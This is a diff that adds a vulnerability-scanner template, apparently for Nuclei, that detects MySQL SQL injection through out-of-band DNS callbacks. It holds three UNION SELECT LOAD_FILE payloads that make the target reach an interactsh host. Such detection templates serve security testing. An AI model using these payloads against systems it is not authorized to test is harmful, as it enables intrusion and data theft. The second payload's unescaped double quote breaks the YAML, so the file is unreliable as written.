@@ -1,0 +1,30 @@
+id: fuzz-mysql-oob
+
+info:
+  name: MySQL OOB via LOAD_FILE
+  author: openai
+  severity: high
+  tags: mysql,sqli,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      mysql_oob:
+        - "1' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - "1" UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - "1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{mysql_oob}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
